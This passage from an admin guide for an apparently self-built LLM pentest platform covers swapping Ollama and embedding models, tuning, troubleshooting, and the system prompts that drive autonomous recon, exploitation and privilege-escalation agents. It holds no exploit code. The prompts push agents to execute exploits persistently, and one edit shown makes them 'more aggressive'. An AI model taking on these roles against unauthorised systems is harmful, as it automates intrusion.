If the output is clean JSON without extra text, the model will work well.

### Testing the new model before production use

```bash
# 1. Start Ollama with new model loaded:
ollama pull your-model-name

# 2. Quick test from command line:
ollama run your-model-name \
  'Plan an nmap scan for 10.10.10.1. Return ONLY JSON: {"tool": "nmap", "args": "..."}'

# 3. Start the platform and run a test session:
python3 agent_server.py

# 4. In the GUI: create a session, start recon, watch Agent Console for LLM thoughts
# Check for: valid JSON in logs, no "parse_error" events, reasonable decisions
```

---

## 15. Changing the Ollama Server

### Moving to a different Ollama host

**Method 1 — Environment variable:**
```bash
export OLLAMA_URL="http://NEW_SERVER_IP:11434"
python3 agent_server.py
```

**Method 2 — Edit source:**

**`agent_server.py`** (line 44):
```python
OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://NEW_SERVER_IP:11434")
```

**`agents/base_agent.py`** (line 34):
```python
OLLAMA_URL = "http://NEW_SERVER_IP:11434"   # ← Your Ollama server
```

### Remote Ollama server setup

On the Ollama server machine:
```bash
# Allow remote connections (Ollama defaults to localhost only):
# Edit the Ollama service or start with:
OLLAMA_HOST=0.0.0.0:11434 ollama serve

# Or configure permanently (systemd):
sudo systemctl edit ollama
# Add:
# [Service]
# Environment="OLLAMA_HOST=0.0.0.0:11434"

# Test from your Kali machine:
curl http://OLLAMA_SERVER_IP:11434/api/tags
```

### Running Ollama locally on Kali

```bash
# Install Ollama on Kali:
curl -fsSL https://ollama.com/install.sh | sh

# Start Ollama (stays running in background):
ollama serve &

# Pull your model:
ollama pull qwen2.5:14b

# Update config to localhost:
export OLLAMA_URL="http://localhost:11434"
python3 agent_server.py
```

### Checking Ollama connectivity

```bash
# Verify Ollama is reachable:
curl http://YOUR_OLLAMA_URL/api/tags

# Expected response:
# {"models":[{"name":"model:tag","size":...},...]}

# Verify your model is loaded:
curl http://YOUR_OLLAMA_URL/api/tags | python3 -m json.tool | grep name

# Check from platform status endpoint (once server is running):
curl http://localhost:5001/status | python3 -m json.tool | grep -A2 ollama
```

---

## 16. Embedding Model Management

The embedding model is **separate** from the LLM model. It is used only for the RAG knowledge base (converting text to vectors for similarity search). It does **not** run through Ollama — it runs directly in Python via `sentence-transformers`.

### Current embedding models

| Model | Size | Speed | Quality | Use case |
|-------|------|-------|---------|----------|
| `all-MiniLM-L6-v2` | 80 MB | Fast | Good | Default — best for most setups |
| `all-mpnet-base-v2` | 420 MB | Slow | Better | Use if quality matters more than speed |
| `BAAI/bge-small-en-v1.5` | 130 MB | Fast | Good | Good alternative to MiniLM |

### Changing the embedding model

```bash
# Set via environment variable before running ingest or starting the server:
export KB_EMBED_MODEL="all-mpnet-base-v2"

# Then MANDATORY — wipe and rebuild KB (can't mix models):
python3 knowledge/ingest_data.py --reset

# Verify new model is being used:
python3 knowledge/ingest_data.py --stats
# Output shows: Embed model: all-mpnet-base-v2
```

**Critical rule:** After changing the embedding model, you MUST run `--reset` and re-ingest. Mixing embeddings from different models in the same ChromaDB collection produces completely wrong search results.

### Changing the reranker model

```bash
# Default reranker:
export KB_RERANK_MODEL="cross-encoder/ms-marco-MiniLM-L-6-v2"

# Alternative (larger, better):
export KB_RERANK_MODEL="cross-encoder/ms-marco-MiniLM-L-12-v2"   # ~120 MB

# Disable reranking entirely (faster, lower precision):
export KB_RERANK_MODEL=""

# The reranker does NOT affect stored embeddings — no --reset needed when changing it
```

### Where models are cached

All Hugging Face models (embedding + reranker) are cached at:
```
~/.cache/huggingface/hub/
```

```bash
# See what's downloaded:
ls ~/.cache/huggingface/hub/

# Space used:
du -sh ~/.cache/huggingface/hub/

# Pre-download a model without running ingest (to check it works):
python3 -c "from sentence_transformers import SentenceTransformer; SentenceTransformer('all-mpnet-base-v2')"
```

### Embedding model config in the codebase

The embedding model config is in `knowledge/knowledge_base.py` (lines 27–30):

```python
EMBED_MODEL  = os.environ.get("KB_EMBED_MODEL",  "all-MiniLM-L6-v2")
RERANK_MODEL = os.environ.get("KB_RERANK_MODEL", "cross-encoder/ms-marco-MiniLM-L-6-v2")
```

You can also edit these constants directly if you always want a specific model without setting environment variables.

---

## 17. LLM Performance Tuning

### Timeout adjustment

If the LLM is slow (large model, remote server) and the agent keeps timing out:

**`agents/base_agent.py`** (line 38):
```python
# Default:
LLM_THINK_TIMEOUT = 120   # 2 minutes per call

# For slow large models (70B+):
LLM_THINK_TIMEOUT = 300   # 5 minutes

# For fast local models:
LLM_THINK_TIMEOUT = 60    # 1 minute
```

### Context window management

The platform sends up to 20 messages of conversation history plus the current prompt. For models with smaller context windows (e.g., 4K tokens):

In `agent_server.py` (line 679), the chat history is limited to 20 messages:
```python
"messages": [{"role": "system", ...}, *history[-20:]],
```

For smaller context models, reduce this:
```python
"messages": [{"role": "system", ...}, *history[-8:]],   # for 4K context models
```

For large context models (32K+), you can increase it:
```python
"messages": [{"role": "system", ...}, *history[-50:]],  # for 32K+ context
```

### Model parameters (temperature, context length)

The platform uses Ollama's default parameters. To set custom parameters, you can use Ollama Modelfiles:

```bash
# Create a custom Modelfile for the pentest model:
cat > /tmp/Pentest.Modelfile << 'EOF'
FROM llama3.1:70b

# Lower temperature = more deterministic JSON output
PARAMETER temperature 0.3

# Extended context for long pentest sessions
PARAMETER num_ctx 16384

# Better for structured output
PARAMETER top_p 0.9
EOF

# Build the custom model:
ollama create pentest-llama3 -f /tmp/Pentest.Modelfile

# Use it in the platform:
export OLLAMA_MODEL="pentest-llama3"
python3 agent_server.py
```

**Recommended parameters for pentest use:**

| Parameter | Value | Reason |
|-----------|-------|--------|
| `temperature` | 0.2–0.4 | Lower = more consistent JSON, less hallucination |
| `num_ctx` | 8192–16384 | Longer context = better memory of session findings |
| `top_p` | 0.85–0.95 | Controls output diversity |
| `repeat_penalty` | 1.1 | Reduces repetition in long outputs |

---

## 18. Agent System Prompts

Each agent type has a specialized system prompt that tells the LLM what role it's playing. These are defined in `agents/base_agent.py` in the `think()` method (lines 774–784).

### Current system prompts

```python
"agentname.master":  "You are the Master Penetration Testing AI. You orchestrate the
                      engagement, plan phases, and interpret results. Follow OSCP/OSWE
                      methodology. Be strategic and specific."

"agentname.recon":   "You are the Recon Specialist AI. Your job is deep reconnaissance:
                      port scanning, service fingerprinting, enumeration, banner grabbing.
                      You decide what to scan next based on what you find. Always go deeper."

"agentname.vuln":    "You are the Vulnerability Assessment AI. You identify vulnerabilities
                      in exact service versions, run targeted NSE scripts, search ExploitDB,
                      and assess exploitability. Be thorough and specific."

"agentname.web":     "You are the Web Application Testing AI. You follow OWASP methodology:
                      directory bruteforce, injection testing, authentication bypass, file
                      inclusion. You adapt your testing based on what each response reveals."

"agentname.exploit": "You are the Exploitation AI. You select and execute the most promising
                      exploits based on discovered vulnerabilities. You adapt when exploits
                      fail and try alternatives. You document every attempt."

"agentname.privesc": "You are the Privilege Escalation AI. Once inside, you systematically
                      check every escalation vector: SUID, sudo, cron, capabilities, kernel
                      exploits, path hijacking. You are thorough and persistent."
```

### How to customize system prompts

Edit `agents/base_agent.py` in the `_agent_systems` dict inside the `think()` method. The dict key is the agent name in lowercase.

**Example — making the exploit agent more aggressive:**
```python
"agentname.exploit":  "You are an expert penetration tester specializing in initial access.
                       You exploit vulnerabilities methodically. You ALWAYS try default
                       credentials first, then known CVEs for exact versions, then web
                       application vulnerabilities. When an exploit fails, you try alternatives
                       immediately. Never give up after one attempt. Document every finding.",
```

**Example — adding OSCP exam focus:**
```python
"agentname.master":   "You are an OSCP-certified penetration tester. You follow the OSCP
                       exam methodology strictly: no metasploit for initial access except
                       one machine, thorough enumeration before exploitation, document every
                       finding. Always explain your reasoning. Prioritize manual exploitation
                       over automated tools.",
```

### System prompt best practices

- Be **specific about methodology** — the LLM follows instructions literally
- Include **output format hints** — "Be specific and technical" improves JSON quality
- Mention **what NOT to do** if you want to restrict behavior (e.g., "never use Metasploit")
- Keep it **concise** — system prompts are included in every call; long prompts waste context

---

## 19. LLM Troubleshooting

### LLM shows as offline / sessions won't start

```bash
# 1. Check Ollama is running:
curl http://YOUR_OLLAMA_URL/api/tags
# Should return JSON with models list

# 2. Check model is available:
curl http://YOUR_OLLAMA_URL/api/tags | python3 -m json.tool | grep '"name"'

# 3. Check from platform:
curl http://localhost:5001/status | python3 -m json.tool
# Look for "ollama": "online"

# 4. If Ollama is running but model is missing:
ollama pull YOUR_MODEL_NAME
```

### Agent keeps timing out on LLM calls

```
[ERROR] LLM timed out after 120s. Pentest halted.
```

**Causes:**
- Large model on slow hardware (70B on CPU = very slow)
- Network latency to remote Ollama server
- Prompt too long (RAG context + intel + history)

**Fixes:**
```python
# agents/base_agent.py — increase timeout:
LLM_THINK_TIMEOUT = 300   # 5 minutes

# Or switch to faster model:
export OLLAMA_MODEL="qwen2.5:14b"  # much faster than 70B
```

### Agent outputs garbage / JSON parse errors

```
[WARNING] JSON parse failed, raw: Sure! Here's the attack plan...
```

**Cause:** Model is not following JSON-only instruction.

**Fixes:**
1. Switch to a model with better instruction following (`qwen2.5` family excels at this)
2. Lower temperature via Modelfile (0.2–0.3 recommended for JSON output)
3. Check you're using the correct model name — typos cause fallback to wrong model

```bash
# Verify model is actually loaded:
ollama list
# Look for exact name: qwen2.5:14b not qwen2.5

# Test JSON compliance:
ollama run qwen2.5:14b 'Return ONLY JSON: {"test": "ok"}'
```

### LLM making poor decisions / wrong tool choices

**Cause:** Context window overflowing, KB context too large, or model too small.

**Fixes:**
1. Reduce `top_k` in KB queries (edit `_kb_context()` calls in `master_agent.py`)
2. Trim prompt sections — reduce the number of agent history messages
3. Upgrade to larger model

### Chat assistant not working (in GUI)

The chat endpoint (`POST /api/chat`) uses its own LLM call in `agent_server.py` (lines 675–680). Check:
```bash
# Test chat endpoint directly:
curl -X POST http://localhost:5001/api/chat \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello", "session_id": null}'
```

---

## 20. Quick Reference Card

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  PLATFORM ADMIN — QUICK REFERENCE
  Run all commands from: /path/to/platform/  (v1/ root)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ── RAG KNOWLEDGE BASE ──────────────────────────────────────────

  SETUP (once):
  pip install -r knowledge/requirements_kb.txt
  python3 knowledge/ingest_data.py              ← initial ingest

  DAILY USE:
  python3 knowledge/ingest_data.py              ← add new files (incremental)
  python3 knowledge/ingest_data.py --stats      ← check KB health
  python3 knowledge/ingest_data.py --search "X" ← test search

  ADDING CONTENT:
  cp new_writeup.pdf knowledge/data/
  python3 knowledge/ingest_data.py

  python3 knowledge/ingest_data.py --add /path/to/file.pdf
  python3 knowledge/ingest_data.py --add-tip "tip text" --category privesc

  MAINTENANCE:
  python3 knowledge/ingest_data.py --force      ← re-process all files
  python3 knowledge/ingest_data.py --reset      ← wipe and rebuild from scratch

  KEY FILES:
  knowledge/data/              ← source documents (drop files here)
  knowledge/chroma_db/         ← vector DB (auto-managed, don't edit)
  knowledge/ingest_data.py     ← ★ main admin tool
  knowledge/knowledge_base.py  ← core API (imported by agents, not run directly)
  knowledge/ingest.py          ← pipeline (called by ingest_data.py)

  ── LLM ENGINE ─────────────────────────────────────────────────

  CHANGE MODEL (no file edit needed):
  OLLAMA_MODEL=qwen2.5:14b python3 agent_server.py
  OLLAMA_MODEL=llama3.1:70b python3 agent_server.py

  CHANGE SERVER:
  OLLAMA_URL=http://192.168.1.50:11434 python3 agent_server.py

  BOTH:
  OLLAMA_URL=http://192.168.1.50:11434 OLLAMA_MODEL=qwen2.5:32b python3 agent_server.py

  EDIT PERMANENTLY — two files:
  agent_server.py     line 44-45  → OLLAMA_URL, MODEL_NAME defaults
  agents/base_agent.py  line 34-38 → OLLAMA_URL, MODEL_NAME, LLM_THINK_TIMEOUT

  OLLAMA MODEL MANAGEMENT:
  ollama list                     ← see installed models
  ollama pull qwen2.5:14b         ← download a model
  ollama rm old-model:tag         ← remove a model
  curl OLLAMA_URL/api/tags        ← check Ollama is reachable

  ── EMBEDDING MODEL ─────────────────────────────────────────────

  CHANGE (then MUST --reset KB):
  KB_EMBED_MODEL=all-mpnet-base-v2 python3 knowledge/ingest_data.py --reset

  DISABLE RERANKER (faster search):
  KB_RERANK_MODEL="" python3 agent_server.py

  MODELS:
  all-MiniLM-L6-v2       →  80 MB  fast,   good quality  (default)
  all-mpnet-base-v2      → 420 MB  slower, better quality
  BAAI/bge-small-en-v1.5 → 130 MB  fast,   good quality

  CHUNK TYPES EXTRACTED FROM DOCS:
  ⚡ command    → tool invocations from writeups
  📜 script     → code blocks and payloads (kept intact)
  📋 procedure  → numbered step-by-step processes
  🎯 technique  → attack methodology descriptions
  💡 tip        → notes, warnings, gotchas
  🔍 finding    → vulnerability descriptions with CVEs
  🔧 tool_usage → tool documentation and flags
  📊 output     → tool output/scan result samples

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---
#### Update Embedding Model

Two steps — one environment variable, then a reset. The embedding model is set in knowledge/knowledge_base.py line 36:

EMBED_MODEL = os.environ.get("KB_EMBED_MODEL", "all-MiniLM-L6-v2")

Option A — Environment variable (no file edit, temporary)
# Set the model, then wipe and re-ingest:
KB_EMBED_MODEL="all-mpnet-base-v2" python3 knowledge/ingest_data.py --reset

Every subsequent run in the same terminal session will use that model. If you close the terminal, it reverts to the default.

Option B — Edit the file directly (permanent)
Open knowledge/knowledge_base.py and change line 36:

# Before:
EMBED_MODEL = os.environ.get("KB_EMBED_MODEL", "all-MiniLM-L6-v2")

# After — pick one:
EMBED_MODEL = os.environ.get("KB_EMBED_MODEL", "all-mpnet-base-v2")        # better quality
EMBED_MODEL = os.environ.get("KB_EMBED_MODEL", "BAAI/bge-small-en-v1.5")   # fast + good

Then run:

python3 knowledge/ingest_data.py --reset

The three options
Model	Size	When to use
all-MiniLM-L6-v2	80 MB	Default — fast CPU, good quality
all-mpnet-base-v2	420 MB	Better search precision, slower ingest
BAAI/bge-small-en-v1.5	130 MB	Good middle ground
The critical rule
--reset is mandatory after changing the model. If you skip it, the new embeddings from your new model sit in the same collection as old embeddings from the old model — cosine similarity between them is meaningless and search returns garbage. The --reset wipes the collection and re-ingests everything from scratch using the new model consistently throughout.

The model downloads automatically on first use from Hugging Face and is cached at ~/.cache/huggingface/hub/ — no internet needed after that first download.

---------------

*This guide covers the RAG system as implemented in the Kali Pentest Platform v3. The knowledge base is fully offline — no cloud services, no API calls for search or embedding. All models run locally on CPU.*
